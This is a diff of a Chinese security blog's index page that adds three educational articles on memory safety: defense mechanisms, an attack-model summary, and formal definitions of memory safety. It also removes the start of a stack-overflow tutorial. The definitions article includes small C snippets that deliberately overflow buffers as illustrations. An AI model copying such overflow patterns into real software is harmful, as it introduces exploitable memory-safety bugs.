@@ -112,6 +112,239 @@
         
           <section id="main">
   
+    <article id="post-memorysafety-defense"  class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" itemprop="name">
+      <a class="article-title" href="/20170101/memorysafety-defense/">内存持久战之防御措施</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	Posted on <a href="/20170101/memorysafety-defense/" class="article-date">
+	  <time datetime="2017-01-01T04:31:03.000Z" itemprop="datePublished">一月 1, 2017</time>
+	</a>
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>作者：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
+<hr>
+<p><strong>CSysSec注</strong>： 本系列文章来自<a href="http://www.chongh.wiki/about/" target="_blank" rel="external">Diting0x</a>的<a href="http://www.chongh.wiki/blog/2016/02/24/memorywar-defense/" target="_blank" rel="external">个人博客</a>，主要介绍内存的安全性问题，以及相应的攻击模型及防御措施，对整个系统安全问题的概览有很大的帮助。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170101/memorysafety-defense/" target="_blank" rel="external">内存持久战之防御措施</a>》与作者信息：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
+<hr>
+<p>继前两篇文章 <a href="http://www.csyssec.org/20170101/memorysafety/" target="_blank" rel="external">内存持久战-内存安全性</a>, <a href="http://www.csyssec.org/20170101/memorysafety-attack/" target="_blank" rel="external">内存持久战-攻击模型</a>, 再加上防御措施，才能算是完整的内存战争。本文首先介绍目前广泛部署的防御机制，然后根据 <a href="http://www.csyssec.org/20170101/memorysafety-attack/" target="_blank" rel="external">内存持久战-攻击模型</a> 每一步实施的攻击破坏介绍相对应的防御细节。</p>
+<h3 id="广泛部署的防御机制"><a href="#广泛部署的防御机制" class="headerlink" title="广泛部署的防御机制"></a>广泛部署的防御机制</h3><p>目前广泛部署的防御机制有栈粉碎性保护（Stack smashing protection)，DEP/W⊕X以及ASLR(Address Space Layout Randomization)。针对Windows平台，也提出了一些特殊的机制，比如 SafeSEH 与 SEHOP 用来保护堆的元数据和异常处理器。</p>
+<p>栈粉碎性保护,SafeSEH以及SEHOP的基本思想是在返回地址与缓冲区(比如函数入口）之间放置随机数作为哨兵（称为cookie或canary),在函数返回前先检测哨兵的值是否被篡改，以达到检测缓冲区溢出攻击的目的。这些机制都属于代码指针保护方式（code pointer integrity),主要检测一些特殊代码指针，如栈上的返回地址、异常处理器指针的完整性，然而对于直接修改（比如索引错误）却无能为力。有关stack smashing 可参考这篇文章 <a href="http://www.drdobbs.com/security/anatomy-of-a-stack-smashing-attack-and-h/240001832?pgno=1" target="_blank" rel="external">Anatomy of a Stack Smashing Attack and How GCC Prevents It
+</a></p>
+<p>W⊕X（write XOR executable)属于DEP（data execution prevention)的子集，是不可执行数据（Non-executable data）与代码完整性(code integrity)的结合。所有现代CPU都支持设置不可执行页面权限，结合不可写代码权限，就可以实施W⊕X机制，很简单也很实际。然而无法防御ROP（return oriented programming),ROP指的是在将现有代码中的可复用代码（可以是现有的函数）以及一些指令序列（gadgets)连接起来实施恶意操作。有关ROP可参考这篇文章，<a href="https://www.blackhat.com/presentations/bh-usa-08/Shacham/BH_US_08_Shacham_Return_Oriented_Programming.pdf" target="_blank" rel="external">Return-oriented Programming:<br>Exploitation without Code Injection</a>.</p>
+<p>ASLR在下文会详细描述。</p>
+<h3 id="防御机制Step-by-step"><a href="#防御机制Step-by-step" class="headerlink" title="防御机制Step-by-step"></a>防御机制Step-by-step</h3><p>从目前提出的所有防御机制来看，可将其划分为两大类：概率性以及确定性防御。概率性机制用来随机化一些对象，如ISR(Instruction Set Randomization), ASLR(Address Space Randomizatioin)以及DSR(Data Space Randomization),可选手段相对较少。 确定性防御机制实施reference monitor, 有关reference monitor的定义可参考，<a href="https://en.wikipedia.org/wiki/Reference_monitor" target="_blank" rel="external">wikipedia page on reference monior</a>, 主要就是在参考验证机制上定义了一些设计要求。 其主要利用静态与动态注入技术，静态注入可在编译阶段实施，动态注入需要在运行时加入代码，损耗相对较大。有关注入技术，可参考前面的文章 <a href="http://www.chongh.wiki/blog/2015/12/18/pin-for-dynamic-binary-instrumentation/" target="_blank" rel="external">PIN for Dynamic Binary Instrumentation</a>。</p>
+<p>下面将针对攻击模型中实施的每个步骤介绍相对应的防御机制，每种防御机制对应每一步的攻击过程。<br>可以先去回顾一下 <a href="http://www.csyssec.org/20170101/memorysafety-attack/" target="_blank" rel="external">内存持久战之攻击模型</a> 的完整实施过程。注意，以下介绍的防御机制并没有时序关系,以横向关系依次描述。</p>
+<p><strong><em>Step 1&amp;2: Memory safety.</em></strong> 考虑完整的内存安全性，空间错误和时域错误都需要阻止。类型安全（Type-safe)的语言通过检查数组边界并使用自动垃圾回收来实施空间与时域安全性。对于非类型安全语言，可嵌入reference monitor针对非安全代码实施类似的策略，对象可以是源码、中间语言、二进制。</p>
+<p>针对空间安全，可跟踪指针边界，将指针结构体的表示方法扩展，加入额外信息。但是这种需要源码标注(annotation)，对于庞大的代码基是不实用的，甚至会改变内存结构带来二进制兼容性问题。可参考 <a href="https://www.cs.virginia.edu/~weimer/p/p477-necula.pdf" target="_blank" rel="external">CCured</a> 项目。为解决兼容性问题，越来越多研究者开始追踪对象边界，不但要知道对象分配的内存区域边界，并利用指针运算而不是引用指针来保护指针边界。</p>
+<p>然而，检测边界并不能解决use-after-free, double-free(use-after-free的特列)问题. 此时，实施时域安全可作为补充。1）特殊的分配器：释放的内存只能被同类型对象重用并对齐。此策略可阻止user-after-free攻击，但对dangling pointers无效；2）基于对象的方法：利用影子内存标记每一块释放的内存位置，如果访问最近被释放的空间就能被检测到。著名的Valgrind内存检测就是利用此方法来检测user-after-free错误的。有关Valgrind的内存检测技术将会在后续的文章<a href="http://www.chongh.wiki/blog/2016/02/20/valgrind-memory/" target="_blank" rel="external">Valgrind内存检测</a> 详细介绍。如果标记的内存区域重新被新的指针指向，对其的非法访问就检测不到了；3）基于指针的方法：同时维护指针的边界信息与内存分配信息实施全面的内存安全。</p>
+<p><strong><em>Step 3: 代码完整性(code integrity, 对应修改代码),代码指针完整性(code pointer integrity，对应修改代码指针)以及数据完整性（data integrity，对应修改数据变量).</em></strong></p>
+<p>代码完整性保证程序中的代码不可写性，可以将含有代码的所有内存页面设置为read-only,所有现代CPU都支持此操作。但是，代码完整性并不支持自我修改(self-modifying)的代码以及即时(Just-In-Time, JIT)编译。代码指针完整性保护指针不被修改，对于不变指针，如全局偏移表、虚拟函数表（vtable),可将其内存页设置read-only。但大部分指针，如定义的函数指针或保存的返回地址必须是可写的。另外，就算内存中所有的函数指针都能实施代码指针完整性，并不能防御use-after-free攻击，例如，通过悬挂指针读取错误的vtable<br>来改变程序的控制流并不会涉及内存中的覆盖代码指针操作。</p>
+<p>数据完整性的实施近似空间安全保护，但并没有实施时域安全保护。数据完整性包括基于对象的完整性保护以及基于points-to集合的完整性保护。基于对象的完整性保护利用静态指针分析来鉴别出不安全的指针集(比如可能会越界的指针)以及指针的points-to集合，然后在代码中插入用影子内存跟踪对象的创建与释放的代码，当对不安全的指针进行写操作或引用操作时会检测指针的位置是否标记在影子内存中。基于points-to集合的完整性保护在基于对象的完整性保护上加了一个限制，每个解引用只能写它自己指向的集合对象，是对其保护的加强。</p>
+<p><strong><em>Step 4: ISR(对应指针转向攻击者特定代码),ASLR（对应指向shellcode或者gadget的地址),DSR(对应解析输出的数据变量).</em></strong></p>
+<p>ISR随机化系统指令来保护代码破坏攻击，随着硬件的更新与发展,ISR技术已经废弃；ASLR随机化代码和数据的存储位置来防御控制流劫持攻击，如果payload(指恶意代码中执行恶意操作的部分）在虚拟内存空间的地址不是固定的，攻击者就无法转移控制流。ASLR也是目前用来保护劫持攻击运用最广泛的技术，然后ASLR的随机化是可预测的，尤其是32位机器，heap-spraying以及JIT-spraying技术可以多次填充payload使随机化失效；</p>
+<p>DSR将存储在内存中的数据形式，而不是存储位置，进行随机化。它为每个变量,包括指针，生成不同的key并进行加密操作，数据的每次读取/存储操作都多了个加解密过程。该方法在代码注入之前都要对指针进行静态分析，overhead较大，但保护比较健壮，能有效防止信息泄露，还能防御控制流劫持以及数据攻击。</p>
+<p><strong><em>Step 5: 控制流完整性（control-flow integrity,对应利用间接跳转指令 call/jump 引用指针，利用返回指令引用指针)以及数据流完整性(data-flow integrity，对应引用破坏后的数据变量).</em></strong></p>
+<p>控制流完整性包括动态返回完整性以及静态控制流图完整性。前文提到的栈粉碎性保护机制不能保护间接调转（call and jump)，不能防御直接修改破坏以及信息泄露，但开销小，兼容性好，所以运用比较广泛。影子栈技术能够解决栈粉碎性保护的信息泄露以及直接修改破坏问题，它把返回地址存入隔离的影子栈中，当函数返回时，对原有栈和影子栈两处保存的值做比较，已保证不被篡改。为了防御控制流劫持，不但要保护返回值，还要保护间接跳转，静态控制流图完整性的方式标记所有的call,jump，并将其标记信息存储在特殊的影子内存中或直接放进代码里; 数据流完整性在数据被使用前，通过检查read指令检测数据是否被破坏。它使用静态points-to分析构建一个全局的可达定义集合（reaching definition sets)，保证数据变量最近一次被写是通过程序中的写指令写入的，而不是攻击者可控制的写入。有关reaching definition sets的定义可参考 <a href="https://en.wikipedia.org/wiki/Reaching_definition" target="_blank" rel="external">wikipedia page on Reaching definition</a>.</p>
+<p><strong><em>Step 6: 不可写数据策略(Non-executable data,对应执行注入的shellcode).</em></strong><br>Non-executable data 保护栈、堆之类的内存页面不可执行，只需要设置内存页面的执行位即可。实际上Non-executable data策略与代码完整性结合就是W⊕X机制。</p>
+<p>每个攻击过程对应的防御机制都已讲完。横向来看，所有攻击模型的每个步骤都有多个防御方法；纵向来看，每种攻击在不同的实施阶段也有不同的防御方法，如控制流劫持攻击，从Step1-6分别有，内存安全性机制（step 1-2),代码指针完整性(step 3),ASLR(step 4), 控制流完整性（step 5）以及不可写数据策略（step 6)不同的防御机制。要阻止某种攻击或多种攻击，需要结合多种防御机制，每种机制也都有其优势与弱点。评判防御机制的性质，可从以下方面去衡量，保护强度、误报率、漏报率、性能开销、内存开销、兼容性，是否模块化等。</p>
+<p>至此，内存持久战系列文章就到这里了，水平有限，很多不到位的地方欢迎补充修正。 回顾一下，最后用下面这张图总结，就清晰明了了。</p>
+<figure><br>    <a href="http://7xppf1.com1.z0.glb.clouddn.com/memorywar.png" target="_blank" rel="external"><img src="http://7xppf1.com1.z0.glb.clouddn.com/memorywar.png" width="450"></a><br>    <figcaption></figcaption><br></figure>
+
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://www.drdobbs.com/security/anatomy-of-a-stack-smashing-attack-and-h/240001832?pgno=1" target="_blank" rel="external">Anatomy of a Stack Smashing Attack and How GCC Prevents It
+</a></p>
+<p><a href="https://www.blackhat.com/presentations/bh-usa-08/Shacham/BH_US_08_Shacham_Return_Oriented_Programming.pdf" target="_blank" rel="external">Return-oriented Programming: Exploitation without Code Injection</a>.</p>
+<p><a href="https://en.wikipedia.org/wiki/Reference_monitor" target="_blank" rel="external">wikipedia page on reference monior</a></p>
+<p><a href="https://www.cs.virginia.edu/~weimer/p/p477-necula.pdf" target="_blank" rel="external">CCured</a></p>
+<p><a href="https://nebelwelt.net/publications/files/13Oakland.pdf" target="_blank" rel="external">S&amp;P’13 Eternal War in Memory </a></p>
+<p>作者[@diting0x] 于Lawson computer science building</p>
+<hr>
+<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170101/memorysafety-defense/" target="_blank" rel="external">内存持久战之防御措施</a>》与作者信息：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
+
+      
+    </div>
+    <footer class="entry-meta entry-footer">
+      
+	<span class="ico-folder"></span>
+    <a class="article-category-link" href="/categories/内存安全/">内存安全</a>
+
+      
+  <span class="ico-tags"></span>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Memory/">Memory</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/System/">System</a></li></ul>
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+<!-- Table of Contents -->
+
+  
+    <article id="post-memorysafety-attack"  class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" itemprop="name">
+      <a class="article-title" href="/20170101/memorysafety-attack/">内存持久战之攻击模型</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	Posted on <a href="/20170101/memorysafety-attack/" class="article-date">
+	  <time datetime="2017-01-01T04:29:44.000Z" itemprop="datePublished">一月 1, 2017</time>
+	</a>
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        
+
+          
+            <div class="entry-summary" style="margin-left:0;">
+            作者：Diting0x
+
+CSysSec注： 本系列文章来自Diting0x的个人博客，主要介绍内存的安全性问题，以及相应的攻击模型及防御措施，对整个系统安全问题的概览有很大的帮助。转载本文请务必注明，文章出处：《内存持久战之攻击模型》与作者信息：Diting0x
+
+内存破坏是计算机安全中亘古不变的话题。内存破坏也被看作是top three危险的软件错误。像C/C++这种底层语言很容易引来这些bugs. 这些程序语言无法对内存安全性的保证，以至于让一些攻击者利用内存bugs改变程序行为或甚至控制整个控制流（control-flow).  要了解什么是内存安全性，可参考上一篇文章：内存持久战-内存安全性.  然而，一种最显而易见的解决方案就是避免这些容易引起内存破坏的程序语言，用一种内存...
+          
+
+        
+          <p class="article-more-link">
+            <a href="/20170101/memorysafety-attack/#more">阅读全文</a>
+          </p>
+        </div>
+      
+    </div>
+    <footer class="entry-meta entry-footer">
+      
+	<span class="ico-folder"></span>
+    <a class="article-category-link" href="/categories/内存安全/">内存安全</a>
+
+      
+  <span class="ico-tags"></span>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Memory/">Memory</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/System/">System</a></li></ul>
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+<!-- Table of Contents -->
+
+  
+    <article id="post-memorysafety"  class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" itemprop="name">
+      <a class="article-title" href="/20170101/memorysafety/">内存持久战之内存安全性</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	Posted on <a href="/20170101/memorysafety/" class="article-date">
+	  <time datetime="2017-01-01T04:10:20.000Z" itemprop="datePublished">一月 1, 2017</time>
+	</a>
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>作者：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
+<hr>
+<p><strong>CSysSec注</strong>： 本系列文章来自<a href="http://www.chongh.wiki/about/" target="_blank" rel="external">Diting0x</a>的<a href="http://www.chongh.wiki/blog/2016/02/18/memory-safety/" target="_blank" rel="external">个人博客</a>，主要介绍内存的安全性问题，以及相应的攻击模型及防御措施，对整个系统安全问题的概览有很大的帮助。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170101/memorysafety" target="_blank" rel="external">内存持久战之内存安全性</a>》与作者信息：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
+<hr>
+<blockquote>
+<ul>
+<li>IEEE Security&amp;Privacy’13</li>
+<li>不访问未定义的内存</li>
+<li>无限间距</li>
+<li>Pointers as capabilities</li>
+</ul>
+</blockquote>
+<p>C语言中的buffer overflows, format string attacks等其它的一些vulnerabilities都有一个共同的问题：违背内存安全(Memory Safety)。本文主要讲述如何准确定义内存安全，为什么这些vulnerabilities违背了内存安全。 也为后续两篇文章<a href="http://www.csyssec.org/20170101/memorysafety-attack" target="_blank" rel="external">内存持久战-攻击模型</a>，<a href="http://www.csyssec.org/20170101/memorysafety-defense" target="_blank" rel="external">内存持久战-防御措施</a>做好铺垫。</p>
+<h3 id="IEEE-Security-amp-Privacy’13"><a href="#IEEE-Security-amp-Privacy’13" class="headerlink" title="IEEE Security&amp;Privacy’13"></a>IEEE Security&amp;Privacy’13</h3><p>发表在IEEE Security&amp;Privacy’13的一篇SoK(Systematization of Knowledge)文章，<a href="https://nebelwelt.net/publications/files/13Oakland.pdf" target="_blank" rel="external">Eternal War in Memory </a>，阐述了一种定义内存安全的通用方法。<br><strong><em>Definition 1:</em></strong> 文中提到，一个程序的执行，只要不会出现以下内存访问错误，就是内存安全的：</p>
+<ul>
+<li>[X] 1.缓冲区溢出</li>
+<li>[X] 2.引用空指针</li>
+<li>[X] 3.释放后使用（use after free）</li>
+<li>[X] 4.使用未初始化内存</li>
+<li>[X] 5.非法释放已经释放过的指针或未分配的指针</li>
+</ul>
+<p>维基百科 <a href="https://en.wikipedia.org/wiki/Memory_safety" target="_blank" rel="external">wikipedia page on memory safety</a> 也有类似的定义。从定义来看，排除这些错误是内存安全本身的定义所导向的，而并非内存安全性的本质。那么，如何将这些错误统一起来？</p>
+<h3 id="不访问未定义的内存"><a href="#不访问未定义的内存" class="headerlink" title="不访问未定义的内存"></a>不访问未定义的内存</h3><p>只有当程序访问未定义的内存时才会产生内存错误，这块内存是在程序中没有具体分配的，例如，<em>heap</em> 的一部分（通过<em>malloc</em>)，<em>stack</em>(作为局部变量或者函数参数），又或者是静态数据区域（作为全局变量). <a href="http://www.cs.berkeley.edu/~necula/" target="_blank" rel="external">George Necula</a> 在他的<em>CCured</em>项目中（旨在为C程序实施内存安全性）提到，一个内存安全的程序从来不会去访问未定义的内存。我们可以假设，内存可以无限的大，大到内存地址从不会复用(reused).如此一来，被释放的内存（可以调用<em>free</em> 或者从函数返回的时候<em>pop</em>）从不会被重新分配，并且会永久的保持未定义状态。</p>
+<p><strong><em>Definition 2:</em></strong> 不访问未定义的内存就是内存安全的。<br>这种定义明显排除了<em>error 2</em> 和 <em>error 3</em>. 如果将<em>allocated</em> 的定义包括<em>initialized</em>，又可以排除<em>error 4</em>. 如果假设<em>free</em>只能在定义过的内存指针中调用，那又可以排除<em>error 5</em>. </p>
+<p>不幸的是，<em>Definition 2</em> 并未排除缓冲区溢出错误，也就是<em>error 1</em>。 来看一个例子，假定一个标准<em>stack</em> 布局， 在此定义下，<em>program 1</em> 的执行会被认为是内存安全的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">/* Program 1 */</div><div class="line">int x;</div><div class="line">int buf[4];</div><div class="line">buf[5] =3; /*overwrite*/</div></pre></td></tr></table></figure>
+<p><em>Definition 2</em> 允许 <em>Program 1</em> 通过是因为此程序是在合法分配的内存中写数据，甚至写的数据类型也是正确的。但实际上问题在于，数组<em>buf</em> 的溢出将数据写进了变量<em>x</em> 中，显然这是内存不安全的。</p>
+<p>###无限间距<br>将 <em>Definition 2</em> 延伸， <em>Program 1</em> 被看作是内存不安全的。只要加上这个假设： 内存区域分配的间距是无限大的。</p>
+<p> <em>Buf</em> 和 <em>x</em> 的分配间距无限的大，<em>buf[5]</em> 将会访问 <em>buf</em> 区域的边界外部。边界外部是个未定义的内存区域，按照上述定义，就会产生错误。<em>heap</em> ,静态数据区域对溢出的处理方式类似。</p>
+<p>尽管 <em>Definition 2</em> 是个很接近让人满意的定义，但事实并未如此。来看 <em>Program 1</em> 的变形 <em>Program 2</em>，也是一种缓冲区溢出, <em>Definition 2</em>  仍然会允许 <em>Program 2</em> 执行。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">/*Program 2 */</div><div class="line">struct foo &#123;</div><div class="line">   int buf[4];</div><div class="line">   int x;</div><div class="line">   &#125;;</div><div class="line">struct foo *pf -malloc(sizeof(struct foo));</div><div class="line">pf-&gt;buf[5] =3;/*overwrite pf-&gt;x*/</div></pre></td></tr></table></figure>
+<p>这里，缓冲区溢出发生在 <em>object</em> 的内部。我们仍然可以类似的在域间引入无限间距的概念来排除缓冲区溢出的错误。这并未太背离现实，C标准允许编译器决定不同域的间距。另一方面，程序语言把结构体当做一个单独的<em>object</em> (从 <em>malloc</em> 返回的单独指针). 许多程序会把一个结构体映射到另一个结构体，或者会确定好一种间距方案。许多编译器都支持这些操作，但是否可以有一种更好的定义不依赖于这些？</p>
+<h3 id="Pointers-as-capabilities"><a href="#Pointers-as-capabilities" class="headerlink" title="Pointers as capabilities"></a>Pointers as capabilities</h3><p>从 <em>Definition 2</em> 中，了解到许多概念，比如，定义的（分配的），未定义的（从没有分配的或者分配后回收的),我们假设分配后回收的内存不会再复用。如此一来，只要访问未定义的内存，就会违背内存安全性。</p>
+<p><strong><em>Definition 3:</em></strong> 我们引入这么一个概念, Pointers as capabilities. 也就是说，允许指针的持有者访问一定区域中的内存。一个指针由三个元素组成<em>（p,b,e)</em>: <em>b</em> 定义有效的区域，<em>e</em> 定义边界，<em>p</em> 代表指针本身。 程序只能操作<em>p</em>，<em>b</em> 和<em>e</em> ,这样做只是为了定义一次执行是否是内存安全的。</p>
+<p>举个例子，看下面的<em>Program 3</em>以及对应的内存效果图：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">/* Program 3 */</div><div class="line">struct foo &#123;</div><div class="line">  int x;</div><div class="line">  int y;</div><div class="line">  char *pc;</div><div class="line">&#125;;</div><div class="line">struct foo *pf = malloc(...);</div><div class="line">pf-&gt;x = 5;</div><div class="line">pf-&gt;y = 256;</div><div class="line">pf-&gt;pc = &quot;before&quot;;</div><div class="line">pf-&gt;pc += 3;</div><div class="line">int *px = &amp;pf-&gt;x;</div></pre></td></tr></table></figure>
+<p><img src="http://7xppf1.com1.z0.glb.clouddn.com/memory-safety3.jpg" alt="memory-safety3"></p>
+<p>重点关注代码的最后两行。<em>Program 3</em> 允许指针运算来新建一个新的指针，但只能当新指针落在b到e之间才能被解引用。从代码中看到，增加 <em>\</em>pc<em>的</em>p<em> ,新指针仍然落在</em>b<em> 和</em>e<em> 之间，所以执行</em>*(pf-&gt;pc)<em> 是合法有效的。但如果执行 </em>pf-&gt;pc+=10<em> , </em>*(pf-&gt;pc)<em> 将会违背内存安全性，尽管</em>pf-&gt;pc<em> 有可能碰巧就落在定义的内存区域中（这块内存区域可能分配给了其它</em>object*).</p>
+<p>最后一行代码创建一个新的指针<em>px</em> 指向<em>pf</em> 指针的第一个域，将边界缩小到其中的一个域中。这就排除了 <em>Program 2</em> 带来的内存溢出问题。加入我们保留<em>pf</em>整个的边界，此程序可能会利用<em>px</em>溢出到结构体中的其它域中。</p>
+<p>Capability是无法伪造的，就像我们并不能伪造一个指针映射到整形数据中。非法映射可以是直接的（<em>e.g. p=(int \</em>)5<em> ） 也可以是间接的，比如将含有整形数据的结构体映射到含有指针的结构体中（</em>e.g. p=(int **)pf<em> ), 将</em>Program 3<em> 中结构体中的第一个整形数据域映射成指针。我们的定义简单的将映射看作是空操作。只有有效的指针才能被解引用，一个指针的capabilities在它创建的时候就已经确定了。 我们的定义中允许 </em>Program 4* 的执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">/* Program 4 */</div><div class="line">int x;</div><div class="line">int *p = &amp;x;</div><div class="line">int y = (int)p;</div><div class="line">int *q = (int *)y</div><div class="line">*q = 5;</div></pre></td></tr></table></figure>
+<p><em>p</em> 指针初始化得<em>b</em> 和<em>e</em> 一直会保持不变，尽管之后<em>p</em> 被转化成整形y, 因此当<em>y</em> 被转回为<em>q</em> 并被解引用的时候，指针依然存在。从另一方面来看，如果在<em>Program 3</em> 的最后加上 <em>p=(int \</em>*)pf<em> , 紧接着 </em>*p=malloc(sizeof(int))<em>， 之后的操作 </em>**p<em>以及</em>printf(“%d\n”,pf-&gt;x)* 都是合法的。也就是说，一块内存区域一开始存储了整形数据，之后也可将整形数据修改为指向整形数据的指针，然后解引用指针，这样操作是安全的，但反过来却不行。</p>
+<p>在某种意义上来说，基于capability定义的内存安全性是一种类型安全形式（type safety)。这里只有两种类型：指针类型和非指针类型。这种定义保证了 1) 指针只在定义了合法内存区域的安全模式下被创建. 2) 指针只有在它们是指向分配给它们的内存区域的情况下被解引用. 3) 那块内存区域仍然是定义过的。这种定义排除了上述所有的五种错误。</p>
+<p>注：本文主要意译 PL Enthusiast 上的一篇文章： <a href="http://www.pl-enthusiast.net/2014/07/21/memory-safety/" target="_blank" rel="external">What is memory safety</a> </p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://www.pl-enthusiast.net/2014/07/21/memory-safety/" target="_blank" rel="external">What is memory safety</a><br><a href="https://nebelwelt.net/publications/files/13Oakland.pdf" target="_blank" rel="external">S&amp;P’13 Eternal War in Memory </a></p>
+<p>作者[@diting0x] 于2016年2月17日Lawson computer science building &amp;&amp; The lodge apartment</p>
+<p>另，感谢<a href="https://nebelwelt.net/publications/files/13Oakland.pdf" target="_blank" rel="external">S&amp;P’13 Eternal War in Memory </a><br>的作者 <a href="https://nebelwelt.net" target="_blank" rel="external">Mathis Payer教授</a> 的某些答疑，感谢感谢好友 <a href="http://www.yebangyu.org/" target="_blank" rel="external">叶邦宇</a> 指出的一些勘误。</p>
+<hr>
+<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170101/memorysafety" target="_blank" rel="external">内存持久战之内存安全性</a>》与作者信息：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
+
+      
+    </div>
+    <footer class="entry-meta entry-footer">
+      
+	<span class="ico-folder"></span>
+    <a class="article-category-link" href="/categories/内存安全/">内存安全</a>
+
+      
+  <span class="ico-tags"></span>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Memory/">Memory</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/System/">System</a></li></ul>
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+<!-- Table of Contents -->
+
+  
     <article id="post-bypassaslr-returntoplt"  class="article article-type-post" itemscope itemprop="blogPost" >
   <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
     
@@ -1222,332 +1455,12 @@ $ echo $?
 <!-- Table of Contents -->
 
   
-    <article id="post-stackbufferflow"  class="article article-type-post" itemscope itemprop="blogPost" >
-  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
+
+
+  <nav id="page-nav">
     
-    
-      <header class="article-header">
-        
-  
-    <h1 class="thumb" itemprop="name">
-      <a class="article-title" href="/20161230/stackbufferflow/">经典栈缓冲区溢出</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-meta">
-      
-	Posted on <a href="/20161230/stackbufferflow/" class="article-date">
-	  <time datetime="2016-12-30T09:00:05.000Z" itemprop="datePublished">十二月 30, 2016</time>
-	</a>
-
-    </div>
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>作者：<a href="http://www.csyssec.org/" target="_blank" rel="external">CSysSec出品</a></p>
-<hr>
-<p><strong>CSysSec注</strong>： 本系列文章译自安全自由工作者<a href="https://sploitfun.wordpress.com/about-2/" target="_blank" rel="external">Sploitfun</a>的漏洞利用系列博客，从经典栈缓冲区漏洞利用堆漏洞利用，循序渐进，是初学者不可多得的好材料，CSyssec计划在原基础上不断添加相关漏洞利用技术以及相应的Mitigation方法，欢迎推荐或自荐文章。</p>
-<h2 id="转载本文请务必注明，文章出处：《Linux-X86-漏洞利用系列-经典栈缓冲区溢出》与作者信息：CSysSec出品"><a href="#转载本文请务必注明，文章出处：《Linux-X86-漏洞利用系列-经典栈缓冲区溢出》与作者信息：CSysSec出品" class="headerlink" title="转载本文请务必注明，文章出处：《Linux(X86)漏洞利用系列-经典栈缓冲区溢出》与作者信息：CSysSec出品"></a><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20161230/stackbufferflow/" target="_blank" rel="external">Linux(X86)漏洞利用系列-经典栈缓冲区溢出</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></h2><blockquote>
-<ul>
-<li>0X01 什么是缓冲区溢出（Buffer Overflow）</li>
-<li>0X02 什么是任意代码执行（Arbitrary Code Execution）</li>
